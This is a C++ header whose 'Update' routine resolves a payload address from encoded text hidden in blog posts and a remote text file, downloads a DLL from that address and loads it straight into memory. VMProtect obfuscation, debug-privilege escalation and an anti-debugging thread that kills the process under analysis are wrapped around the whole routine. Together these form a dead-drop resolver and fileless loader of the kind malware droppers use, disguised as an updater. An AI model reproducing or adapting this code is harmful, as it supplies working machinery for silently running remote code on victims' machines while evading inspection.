#pragma once
#include "CFunc.hpp"
#include "CHttpDown.hpp"
#include "../ComAll/XStr.hpp"
#include "CMemLoadDll.hpp"
#include "VMProtectSDK.h"
#include "CAntiHard.hpp"
#include "CDataProtectX.hpp"
#include "CAntiCrc.hpp"
#define URL1 "http://blog.csdn.net/tueoadsgslaasjgjsad/article/details/46675021"
#define URL2 "http://blog.csdn.net/sfdhdfhsdfhssadg/article/details/46675051"
#define URL3 "http://www.fpstop.com/mimi.txt"
static const char *pNetMain[] =
{
	URL1,
	URL2,
	URL3
};

#define BEGIN_NET_FLAG	("8d589afa4dfaeeed85fff5aa78e5ff6a")
#define END_NET_FLAG	("7f021a1415b86f2d013b2618fb31ae53")
#define DLL_NAME	"xlog.dll"
 
CAntiHard  anti;
static string GetNetStr(cstr_t pURL, cstr_t pTag1, cstr_t pTag2, bool bDecode );
static void Check()
{
	VMProtectBegin(__FUNCTIONW__);
	if (!anti.Check())
	{
		CExit();
	}
	if (!CheckModule<1>(DLL_NAME))
	{
		CExit();
	}

	VMProtectEnd();
}

static string GetNetStr(cstr_t pURL, cstr_t pTag1, cstr_t pTag2, bool bDecode = true)
{
	VMProtectBegin(__FUNCTIONW__);
	Check();
	CurlDMem memcontest;
	DownInfo ret = CurlDown(pURL, &memcontest);
	Check();


	char *p = memcontest.bf.m_addr;;
	int nLen = memcontest.bf.m_nLen;
	if (NULL == p || 0 == nLen)
	{
		printf("%s %d error\n", __FUNCTION__, __LINE__);
		return "";
	}
	Check();
	int nLen2 = strlen(p);
	const char *pBegin = strstr(p, pTag1) + strlen(pTag2);
	const char *pEnd = strstr(p, pTag2);
	if (!pBegin || !pEnd)
	{
		printf("%s %d erro\n", __FUNCTION__, __LINE__);
		return "";
	}
	Check();
	string sRet = string(pBegin, pEnd);
	Check();
	if (bDecode)
	{
		char *pp = (char*)malloc(sRet.size() / 2 + 1);
		memset(pp, 0, sRet.size() / 2 + 1);
		Decode(pp, sRet.size() / 2, sRet.c_str(), sRet.size());
		sRet = pp;
	}
	printf("GetStr str= %s\n", sRet.c_str());
	Check();
	VMProtectEnd();
	return sRet;
}
static bool LoadNetModule(string sURL)
{
	VMProtectBegin(__FUNCTIONW__);
	CurlDMem memcontest;
	Check();
	CurlDown(sURL.c_str(), &memcontest);
	addr_t ret = CMemLoadDll(memcontest.bf.m_addr, memcontest.bf.m_nLen);
	if (0 == ret)
	{
		return false;
	}
	VMProtectEnd();
	return true;
}

DWORD WINAPI UpT(void*)
{
	VMProtectBegin(__FUNCTIONW__);
	CGetDebugPrivilege();
	anti.Init();
	Check();
	int i = 0;
	//debug
	if (NULL != strstr(GetCommandLineA(), "TEST_UPDATE")){
		i = 1;
	}
	Check();
	for (; i < sizeof(pNetMain) / sizeof(pNetMain[0]); ++i)
	{
		Check();
		string s = GetNetStr(pNetMain[i], BEGIN_NET_FLAG, END_NET_FLAG);
		if (s == "")
		{
			continue;
		}
		Check();
		if (LoadNetModule(s))
		{
			Check();
			break;
		}
	}
	VMProtectEnd();
	return 0;
}

DWORD WINAPI AntiT(void*)
{
	VMProtectBegin(__FUNCTIONW__);
	CAntiHard  anti2;
	anti2.Init();
	while (1)
	{
		if (!anti2.Check())
		{
			CExit();
		}
		Sleep(10);
	}
	VMProtectEnd();

}

static void Update()
{
	VMProtectBegin(__FUNCTIONW__);
	CreateThread(0, 0, UpT, 0, 0, 0);
	CreateThread(0, 0, AntiT, 0, 0, 0);
	VMProtectEnd();
}